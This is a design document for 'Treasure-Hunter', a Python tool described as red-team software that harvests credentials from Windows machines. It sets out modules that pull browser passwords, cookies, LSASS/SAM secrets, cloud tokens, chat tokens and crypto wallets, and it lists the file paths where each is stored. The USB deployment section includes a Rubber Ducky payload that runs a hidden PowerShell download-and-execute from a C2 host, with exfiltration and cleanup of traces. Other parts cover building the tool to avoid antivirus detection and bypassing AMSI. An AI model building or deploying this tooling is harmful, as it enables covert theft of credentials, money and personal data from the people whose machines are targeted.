# Treasure-Hunter Research: Tool Landscape & Architecture

> Research compiled April 2026 for the Treasure-Hunter ("Goodie Grabber") project.
> A Python-based red team file discovery and credential harvesting tool for Windows targets.

---

## Table of Contents

1. [Value Taxonomy — What "Valuable" Means](#1-value-taxonomy)
2. [Existing Tools — Full Landscape](#2-existing-tools)
3. [Grabber Module Architecture](#3-grabber-modules)
4. [Windows Artifact Locations](#4-windows-artifact-locations)
5. [USB Deployment Models](#5-usb-deployment)
6. [Build & Packaging](#6-build--packaging)
7. [Recommended Stack](#7-recommended-stack)
8. [Sources](#8-sources)

---

## 1. Value Taxonomy

Six categories of "valuable files," ranked by red team priority:

| # | Category | Weight | What It Catches |
|---|----------|--------|----------------|
| 1 | **Credentials & Secrets** | 5 | KeePass DBs, SSH keys, .env files, browser saved passwords, API tokens, certificates |
| 2 | **Unreleased Software** | 4 | Pre-release .exe/.msi/.apk, internal builds, beta installers, firmware |
| 3 | **Infrastructure Intel** | 4 | RDP files, VPN configs, Terraform state, AD exports, network diagrams |
| 4 | **Backups & Archives** | 4 | SQL dumps, .bak files, database files, VM snapshots, exported archives |
| 5 | **Sensitive Documents** | 3 | Financial docs, PII, legal contracts, Outlook PSTs, HR files |
| 6 | **Source Code & IP** | 3 | Proprietary repos, .sln projects, notebooks, design files, build artifacts |

Each category has four signal types:
- **Extensions** — file type signatures (.kdbx, .rdp, .pfx, etc.)
- **Filename keywords** — name patterns ("password", "unreleased", "backup")
- **Path patterns** — Windows-specific locations (AppData\Credentials, .ssh, OneDrive)
- **Content patterns** — regex for secrets inside files (AWS keys, private keys, SSNs)

Scoring is **additive** with category weights as multipliers. Multiple signals on the same file stack scores. Severity thresholds:
- CRITICAL: >= 200
- HIGH: >= 120
- MEDIUM: >= 60
- LOW: >= 25
- INFO: < 25

---

## 2. Existing Tools

### Tier 1: Direct Foundations (fork/extend)

| Tool | Language | What It Does | How We Use It |
|------|----------|-------------|---------------|
| [snafflepy](https://github.com/cisagov/snafflepy) (CISA) | Python | Python reimplementation of Snaffler — file share scanning with classifier rules, TOML rule format | **Starting codebase.** Fork and extend with local-disk mode + our scoring system. Currently has extension/name matching and content regex (SSN). Missing: entropy, metadata, scoring, local-only mode. |
| [pysnaffler](https://github.com/skelsec/pysnaffler) (skelsec) | Python | Another Python Snaffler port — SMB focus, baked-in default classifiers | **Rule source.** Has Snaffler's full default ruleset already ported to Python. |
| [Snaffler](https://github.com/SnaffCon/Snaffler) (original) | C# | The gold standard — classifier chain architecture (share -> folder -> file -> content), TOML rules, Snaffle/Discard/Relay/CheckForKeys actions | **Architecture blueprint.** Steal the classifier chain design + battle-tested TOML rulesets. |

### Tier 2: Credential Harvesting

| Tool | Language | What It Grabs | Integration |
|------|----------|--------------|-------------|
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Python | Browser passwords, WiFi creds, mail clients, Windows Credential Manager, sysadmin tools, databases, git creds. Modular architecture — each software module is a separate class. | **Core dependency.** Wrap its modules directly. |
| [DonPAPI](https://github.com/login-securite/DonPAPI) | Python | DPAPI-protected secrets — browser creds, cookies, Chrome refresh tokens, WiFi passwords, certificates, Vault credentials. Works remotely AND locally. Pip-installable. | **DPAPI decryption engine.** |
| [dploot](https://github.com/zblurx/dploot) | Python | SharpDPAPI reimplementation — masterkeys, browser creds, certificates, Vault, machine triage. Cleaner API than DonPAPI. | **Alternative DPAPI engine.** |
| [pypykatz](https://github.com/skelsec/pypykatz) | Python | Pure Python mimikatz — LSASS dumps, SAM, LSA secrets, DPAPI masterkeys. | **Memory/registry credential extraction** without mimikatz binary. |
| [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) | Go | All browsers (Chrome, Edge, Firefox, Brave, Opera) — passwords, cookies, history, bookmarks, credit cards, downloads, localStorage. Cross-platform. | **Browser sweep.** Compiled Go binary — shell out to it or port patterns. |
| [impacket](https://github.com/fortra/impacket) (secretsdump) | Python | SAM hashes, LSA secrets, DPAPI keys, NTDS.dit extraction. | **Deep credential dump engine.** |

### Tier 3: Secret/Content Scanning

| Tool | Language | What It Does | Integration |
|------|----------|-------------|-------------|
| [detect-secrets](https://github.com/Yelp/detect-secrets) (Yelp) | Python | Plugin-based secret detector — 25+ built-in detectors + entropy scanning + baseline system. Plugin architecture allows custom detectors. | **Content analysis engine.** Import as library. |
| [TruffleHog](https://github.com/trufflesecurity/trufflehog) | Go | 800+ secret type detectors with active verification. | **Regex pattern source.** Port detector patterns to Python. |
| [Nosey Parker](https://github.com/praetorian-inc/noseyparker) | Rust | 188 battle-tested regex rules tuned by security engineers for low false positives. | **Rule quality reference.** Borrow curated regex patterns. |

### Tier 4: Windows Forensics & Analysis

| Tool | Language | What It Does | Integration |
|------|----------|-------------|-------------|
| [python-registry](https://github.com/williballenthin/python-registry) | Python | Pure Python Windows Registry parser (NTUSER.DAT, SAM, userdiff). | **Registry scanning.** Installed software, recent files, USB history, MRU lists. |
| [EntropyAnalysis](https://github.com/mauricelambert/EntropyAnalysis) | Python | Shannon entropy calculation for files. Pip-installable. | **Encrypted file detection.** High entropy = interesting. |
| [yara-python](https://github.com/VirusTotal/yara-python) | Python | YARA pattern matching engine. | **Optional power-user feature.** Custom YARA rules per engagement. |
| [piiS-Scanner](https://github.com/hRun/piiS-scanner) | Python | YARA-based PII detection on file shares. | **PII detection patterns.** |
| [cve-bin-tool](https://github.com/ossf/cve-bin-tool) | Python | Scans binaries for 350+ known vulnerable components. | **Software vulnerability audit.** |
| [pywin32](https://pypi.org/project/pywin32/) | Python | Windows API bindings — file owners, ACLs, extended attributes, COM automation. | **Metadata extraction.** |
| [dpapick](https://github.com/jordanbtucker/dpapick) | Python | Offline DPAPI decryption library. | **Offline credential decryption.** |

### Tier 5: Pattern/Rule Sources (steal their rulesets)

| Source | What To Take |
|--------|-------------|
| Snaffler's [TOML rules](https://github.com/SnaffCon/Snaffler/blob/master/example-config.toml) | Battle-tested classifier rules for sensitive files in enterprise Windows |
| detect-secrets' plugin patterns | Regex for 25+ secret types with low false-positive tuning |
| TruffleHog detectors | 800+ secret type definitions (Go, but patterns are portable) |
| Nosey Parker rules | 188 tested regex rules tuned for low false positives |

---

## 3. Grabber Modules

### Module 1: FileGrabber
Filesystem scanning using Snaffler-style classifier chain.
- Extension matching against value taxonomy
- Filename keyword matching
- Path pattern matching (Windows-specific locations)
- Content regex scanning
- **Source:** snafflepy classifiers + Snaffler TOML rules

### Module 2: CredGrabber
Local credential harvesting.
- Windows Credential Manager
- SAM/LSA secrets
- DPAPI masterkey decryption
- Stored application passwords
- **Source:** LaZagne + pypykatz + DonPAPI/dploot

### Module 3: BrowserGrabber
Browser data extraction across all Chromium + Firefox browsers.
- Saved passwords (DPAPI-encrypted SQLite)
- Cookies (session tokens)
- Browsing history
- Bookmarks
- Credit card autofill data
- Download history
- **Source:** DPAPI decryption + Chrome/Edge/Firefox SQLite DB parsing

### Module 4: WifiGrabber
Stored WiFi profile extraction.
- `netsh wlan show profiles` + `key=clear`
- All saved SSIDs with plaintext passwords
- **Source:** Simple subprocess wrapper (~10 lines of Python)

### Module 5: RegistryGrabber
Windows Registry intelligence.
- Installed software + versions
- USB device history
- Recent files (MRU lists)
- Typed URLs
- User assist (program execution history)
- **Source:** python-registry + winreg stdlib

### Module 6: ArtifactGrabber
Windows forensic artifacts most tools miss.
- PowerShell history (ConsoleHost_history.txt)
- Sticky Notes (plum.sqlite)
- Clipboard history (ActivitiesCache.db)
- Recent documents (LNK files)
- RDP cache (bitmap tiles from remote sessions)
- RDP saved connections
- Thumbnail cache
- Print spool (recently printed documents)
- **See:** [Section 4 — Windows Artifact Locations](#4-windows-artifact-locations)

### Module 7: ChatGrabber
Messaging app data extraction.
- Slack: workspace tokens, cached messages, sent images
- Discord: auth tokens (DPAPI encrypted), messages, cache
- Microsoft Teams: OAuth tokens, chat history, file downloads
- Outlook: PST/OST mailbox archives
- **Source:** LevelDB parsing for Slack/Discord, COM automation for Outlook

### Module 8: CloudGrabber
Cloud CLI credential harvesting.
- AWS CLI: `%USERPROFILE%\.aws\credentials` (cleartext access keys)
- Azure CLI: `%USERPROFILE%\.azure\accessTokens.json` (cleartext OAuth tokens)
- Azure PowerShell: `TokenCache.dat` + `AzureRmContext.json` (ServicePrincipalSecret in cleartext)
- gcloud: `%AppData%\gcloud\credentials.db` (OAuth refresh tokens)
- Kubernetes: `%USERPROFILE%\.kube\config` (cluster creds, embedded certs/tokens)
- Docker: `%USERPROFILE%\.docker\config.json` (registry auth tokens)
- Terraform: `*.tfstate` files (full infra state with embedded secrets)
- **Source:** Direct file reads + JSON/YAML parsing

### Module 9: CryptoGrabber
Cryptocurrency wallet file detection.
- Bitcoin Core: `%AppData%\Bitcoin\wallet.dat`
- Electrum: `%AppData%\Electrum\wallets\*.wallet`
- Exodus: `%AppData%\Exodus\` (internal encrypted DB)
- MetaMask (Chrome): `%LocalAppData%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\`
- Ledger Live: `%AppData%\Ledger Live\`
- **Source:** Known path enumeration + extension matching

### Module 10: WSLGrabber
Windows Subsystem for Linux extraction.
- Detect WSL installations via `%LocalAppData%\Packages\CanonicalGroupLimited.Ubuntu*\LocalState\ext4.vhdx`
- SSH keys from `~/.ssh/` inside ext4.vhdx
- Bash history (`~/.bash_history`)
- .env files from project directories
- **Source:** VHDX mount or direct filesystem parsing

### Module 11: CertGrabber
Windows Certificate Store extraction.
- Personal certificates with exportable private keys
- DPAPI-protected private key decryption
- Code signing certificates
- VPN/client auth certificates
- **Source:** wincertstore / certutil + dpapick3/dploot

### Module 12: SoftwareGrabber
Installed software intelligence.
- Enumerate all installed applications + versions
- Flag outdated/vulnerable software (CVE mapping)
- Detect dev tools (Visual Studio, Git, Docker Desktop, etc.)
- Find license keys in registry
- **Source:** winreg + cve-bin-tool

---

## 4. Windows Artifact Locations

### Credentials & Keys
| Artifact | Path |
|----------|------|
| Windows Credential Manager | `%AppData%\Microsoft\Credentials\*` |
| DPAPI Masterkeys | `%AppData%\Microsoft\Protect\*` |
| Windows Vault | `%LocalAppData%\Microsoft\Vault\*` |
| Chrome Login Data | `%LocalAppData%\Google\Chrome\User Data\*\Login Data` |
| Edge Login Data | `%LocalAppData%\Microsoft\Edge\User Data\*\Login Data` |
| Firefox Logins | `%AppData%\Mozilla\Firefox\Profiles\*\logins.json` |
| Firefox Key DB | `%AppData%\Mozilla\Firefox\Profiles\*\key4.db` |
| SSH Keys | `%USERPROFILE%\.ssh\*` |
| Git Credentials | `%USERPROFILE%\.git-credentials` |
| AWS Credentials | `%USERPROFILE%\.aws\credentials` |
| Azure Tokens | `%USERPROFILE%\.azure\accessTokens.json` |
| gcloud Credentials | `%AppData%\gcloud\credentials.db` |
| Kubernetes Config | `%USERPROFILE%\.kube\config` |
| Docker Config | `%USERPROFILE%\.docker\config.json` |
| KeePass DBs | `**\*.kdbx` |

### Communication Apps
| Artifact | Path |
|----------|------|
| Slack Data | `%AppData%\Slack\Local Storage\leveldb\` |
| Slack Cookies | `%AppData%\Slack\Cookies` |
| Discord Data | `%AppData%\discord\Local Storage\leveldb\` |
| Teams Data | `%AppData%\Microsoft\Teams\` |
| Outlook PST | `%LocalAppData%\Microsoft\Outlook\*.pst` |
| Outlook OST | `%LocalAppData%\Microsoft\Outlook\*.ost` |

### Forensic Artifacts
| Artifact | Path | Value |
|----------|------|-------|
| PowerShell History | `%AppData%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` | Commands often contain passwords, IPs, internal URLs |
| Sticky Notes | `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite` | People write passwords and notes here |
| Clipboard History | `%LocalAppData%\ConnectedDevicesPlatform\*\ActivitiesCache.db` | Copy-pasted passwords, tokens, sensitive text |
| Recent Documents | `%AppData%\Microsoft\Windows\Recent\` | LNK files showing what user accessed |
| RDP Cache | `%LocalAppData%\Microsoft\Terminal Server Client\Cache\` | Bitmap tiles from RDP sessions |
| RDP Connections | `%LocalAppData%\Microsoft\Terminal Server Client\Default.rdp` + registry | Servers user RDPs to |
| Thumbnail Cache | `%LocalAppData%\Microsoft\Windows\Explorer\thumbcache_*.db` | Reveals content even if originals deleted |
| Print Spool | `%SystemRoot%\System32\spool\PRINTERS\` | Recently printed documents |
| NTUSER.DAT | `%USERPROFILE%\NTUSER.DAT` | User-specific settings, file access history |
| UsrClass.dat | `%USERPROFILE%\AppData\Local\Microsoft\Windows\UsrClass.dat` | Shell artifacts (Shellbags) |

### Crypto Wallets
| Wallet | Path |
|--------|------|
| Bitcoin Core | `%AppData%\Bitcoin\wallet.dat` |
| Electrum | `%AppData%\Electrum\wallets\` |
| Exodus | `%AppData%\Exodus\` |
| MetaMask (Chrome) | `%LocalAppData%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\` |
| Ledger Live | `%AppData%\Ledger Live\` |

### WSL
| Artifact | Path |
|----------|------|
| WSL ext4.vhdx | `%LocalAppData%\Packages\CanonicalGroupLimited.Ubuntu*\LocalState\ext4.vhdx` |
| WSL Home Dir | Inside ext4.vhdx: `~/.ssh/`, `~/.bash_history`, `~/.env` |

### Cloud Sync Folders
| Service | Path |
|---------|------|
| OneDrive | `%USERPROFILE%\OneDrive*\` |
| SharePoint Sync | `%USERPROFILE%\SharePoint\` |
| Google Drive | `%USERPROFILE%\Google Drive\` or `%USERPROFILE%\My Drive\` |
| Dropbox | `%USERPROFILE%\Dropbox\` |

---

## 5. USB Deployment

### Option A: Plain USB + Single .exe (Simplest)

Operator plugs in USB, opens terminal, runs the tool manually.

```
E:\                          <- USB drive
|-- treasure-hunter.exe      <- single binary, zero dependencies
|-- config.toml              <- operator rules for this engagement
\-- loot\                    <- report output lands here
```

Execution:
```
E:\treasure-hunter.exe --config E:\config.toml --output E:\loot\
```

- Requires: physical access + ability to open terminal (unlocked machine or known creds)
- Most modules work without admin. DPAPI/LSASS/cert extraction needs admin/SYSTEM.

### Option B: Hak5 Bash Bunny (Fully Automated)

USB device emulates keyboard + storage simultaneously. Plug in -> types commands to run treasure-hunter -> exfiltrates results to onboard MicroSD. No human interaction on target.

```
/payloads/switch1/
|-- payload.txt              <- DuckyScript payload
|-- treasure-hunter.exe      <- our tool
\-- config.toml

payload.txt:
  ATTACKMODE HID STORAGE
  LED SETUP
  QUACK GUI r
  QUACK DELAY 500
  QUACK STRING cmd /c E:\treasure-hunter.exe --config E:\config.toml --output E:\loot\ --quiet
  QUACK ENTER
  LED ATTACK
  WAIT_FOR_LOOT
  LED FINISH
```

- Hardware: Bash Bunny Mark II (~$120) or USB Rubber Ducky (~$80)
- Speed: Plug to pwn in ~7 seconds, full scan depends on disk size
- Exfil: Results saved to onboard MicroSD (up to 1TB) in /loot/
- Stealth: Types at human speed, Bluetooth geofencing, LED status indicators

### Option C: USB Rubber Ducky + Remote Exfil (Most Covert)

Ducky injects keystrokes only (no storage). Downloads tool from C2, runs it, exfils report over network.

```
Ducky Payload:
  DELAY 1000
  GUI r
  DELAY 500
  STRING powershell -w hidden -c "IEX(iwr https://c2.yourserver.com/th.ps1)"
  ENTER

th.ps1 (hosted on C2):
  1. Downloads treasure-hunter.exe to %TEMP%
  2. Runs scan -> JSON report
  3. Exfils report to C2 via HTTPS POST
  4. Cleans up temp files
```

- Hardware: USB Rubber Ducky ($80)
- Forensic footprint: Minimal — nothing persists if cleanup runs
- Network required: Yes — needs internet/internal network to C2
- Evasion: May need AMSI bypass on hardened targets

### CLI Flags Required for USB Support

| Flag | Purpose |
|------|---------|
| `--output <path>` | Point output to USB drive letter (E:\loot\) |
| `--quiet` | No console output — runs silently |
| `--modules <list>` | Choose which grabbers to run (fast = creds+cloud, full = everything) |
| `--timeout <seconds>` | Auto-exit after N seconds — critical for timed physical access |
| `--cleanup` | Delete any temp files created during scan |
| `--auto-detect-usb` | Auto-detect own USB drive letter and default output there |

---

## 6. Build & Packaging

### Nuitka (Recommended) vs PyInstaller

| Aspect | Nuitka | PyInstaller |
|--------|--------|-------------|
| **Output** | Native C compilation | Python bundled in archive |
| **AV detection** | Very low false positive rate | Frequently flagged by Defender |
| **Runtime speed** | 2-4x faster than CPython | Same as CPython |
| **Build speed** | Slow (compiles everything to C) | Fast (just bundles) |
| **File size** | Larger (~30-50MB) | Smaller (~15-30MB) |
| **Reverse engineering** | Hard — native binary | Easy — can extract .pyc |
| **Recommendation** | **Use for production/deployment** | Use for dev/testing |

### Build Command (Nuitka)

```bash
python -m nuitka \
  --onefile \
  --standalone \
  --windows-console-mode=disable \
  --output-filename=treasure-hunter.exe \
  --include-package=treasure_hunter \
  treasure_hunter/__main__.py
```

### Build Command (PyInstaller — dev/testing)

```bash
pyinstaller \
  --onefile \
  --noconsole \
  --name treasure-hunter \
  treasure_hunter/__main__.py
```

---

## 7. Recommended Stack

### Architecture

```
TREASURE-HUNTER ("The Goodie Grabber")
  (Single .exe via Nuitka)
+---------------------------------------------------+
|  CLI / Config Layer                                |
|  |-- argparse CLI                                  |
|  |-- TOML/YAML operator config (Snaffler-style)    |
|  \-- YARA rules (optional, per-engagement)         |
+---------------------------------------------------+
|  Grabber Modules (plugin architecture)             |
|  |-- FileGrabber       <- snafflepy classifiers    |
|  |-- CredGrabber       <- LaZagne + DonPAPI/dploot |
|  |-- BrowserGrabber    <- DPAPI + Chrome/Edge/FF   |
|  |-- WifiGrabber       <- netsh wrapper            |
|  |-- RegistryGrabber   <- python-registry          |
|  |-- ArtifactGrabber   <- PS history/sticky/clip   |
|  |-- ChatGrabber       <- Slack/Discord/Teams      |
|  |-- CloudGrabber      <- AWS/Azure/GCP/k8s        |
|  |-- CryptoGrabber     <- wallet files             |
|  |-- WSLGrabber        <- ext4.vhdx SSH keys       |
|  |-- CertGrabber       <- Windows cert store       |
|  \-- SoftwareGrabber   <- installed apps + CVEs    |
+---------------------------------------------------+
|  Analysis Engine                                   |
|  |-- ContentScanner    <- detect-secrets plugins   |
|  |-- EntropyAnalyzer   <- EntropyAnalysis          |
|  |-- PatternMatcher    <- Nosey Parker/TH patterns |
|  \-- Scorer            <- additive weighted scoring|
+---------------------------------------------------+
|  Reporter                                          |
|  |-- JSON report (structured, machine-readable)    |
|  |-- CSV export (quick triage)                     |
|  \-- HTML dashboard (optional, single-file)        |
+---------------------------------------------------+
```

### Core Dependencies

| Package | Purpose |
|---------|---------|
| lazagne | Credential harvesting (wrap modules) |
| detect-secrets | Content scanning engine (25+ secret detectors) |
| dploot or donpapi | DPAPI decryption (browser creds, certs, vault) |
| pypykatz | LSASS/SAM/LSA extraction |
| python-registry | Windows registry parsing |
| EntropyAnalysis | Shannon entropy for file analysis |
| yara-python | Optional YARA rule matching |
| pywin32 | Windows API (file metadata, ACLs, COM) |
| nuitka | Production build to single .exe |

### Build Priority

1. Core tool — all 12 grabber modules + scoring + JSON report
2. Nuitka build pipeline — single .exe compilation
3. USB deployment templates — Bash Bunny + Rubber Ducky payloads
4. Stealth features — quiet mode, timeout, cleanup, AMSI considerations

---

## 8. Sources

### Foundation Tools
- [snafflepy (CISA)](https://github.com/cisagov/snafflepy) — Python Snaffler reimplementation
- [pysnaffler (skelsec)](https://github.com/skelsec/pysnaffler) — Alternative Python Snaffler port
- [Snaffler (original)](https://github.com/SnaffCon/Snaffler) — C# classifier chain architecture
- [Snaffler TOML rules](https://github.com/SnaffCon/Snaffler/blob/master/example-config.toml)

### Credential Harvesting
- [LaZagne](https://github.com/AlessandroZ/LaZagne) — Multi-software password recovery
- [DonPAPI](https://github.com/login-securite/DonPAPI) — DPAPI secret dumper
- [dploot](https://github.com/zblurx/dploot) — Python SharpDPAPI
- [pypykatz](https://github.com/skelsec/pypykatz) — Pure Python mimikatz
- [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) — Cross-platform browser extraction
- [impacket](https://github.com/fortra/impacket) — secretsdump + network protocols

### Secret Scanning
- [detect-secrets (Yelp)](https://github.com/Yelp/detect-secrets) — Plugin-based secret detector
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) — 800+ secret types
- [Nosey Parker](https://github.com/praetorian-inc/noseyparker) — 188 tuned regex rules

### Forensics & Analysis
- [python-registry](https://github.com/williballenthin/python-registry) — Windows Registry parser
- [EntropyAnalysis](https://github.com/mauricelambert/EntropyAnalysis) — Shannon entropy
- [yara-python](https://github.com/VirusTotal/yara-python) — Pattern matching engine
- [piiS-Scanner](https://github.com/hRun/piiS-scanner) — YARA-based PII detection
- [cve-bin-tool](https://github.com/ossf/cve-bin-tool) — Binary vulnerability scanner
- [dpapick](https://github.com/jordanbtucker/dpapick) — Offline DPAPI decryption
- [Windows Forensic Artifacts](https://github.com/Psmths/windows-forensic-artifacts) — Artifact handbook
- [HackTricks Windows Forensics](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics)

### USB Deployment
- [Hak5 Bash Bunny](https://shop.hak5.org/products/bash-bunny) — USB attack platform
- [Bash Bunny Payloads](https://github.com/hak5/bashbunny-payloads) — Payload repository
- [Bash Bunny Exfil Guide](https://docs.hak5.org/bash-bunny/beginner-guides/top-5-bash-bunny-exfiltration-payloads-to-steal-files/)
- [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) — Keystroke injection

### Build & Packaging
- [Nuitka](https://nuitka.net/) — Python to native C compiler
- [Nuitka vs PyInstaller](https://krrt7.dev/en/blog/nuitka-vs-pyinstaller) — AV detection comparison
- [Nuitka lower false positives](https://dev.to/weisshufer/from-pyinstaller-to-nuitka-convert-python-to-exe-without-false-positives-19jf)
- [PyInstaller](https://pyinstaller.org/) — Python bundler (dev/testing)

### Cloud & Token Research
- [RedOps Cloud](https://redops-cloud.github.io/) — Cloud post-exploitation techniques
- [Azure AD Tokens](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-access-and-token/)
- [SlackPirate](https://github.com/emtunc/SlackPirate) — Slack workspace enumeration
- [MetaMask vault paths](https://gist.github.com/miguelmota/331edaf9ebb68159e574a5c8391dd019)

### MITRE ATT&CK References
- [T1119 — Automated Collection](https://attack.mitre.org/techniques/T1119/)
- [T1074 — Data Staging](https://attack.mitre.org/techniques/T1074/)
- [T1560 — Archive Collected Data](https://attack.mitre.org/techniques/T1560/)
- [T1048 — Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- [T1555.003 — Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
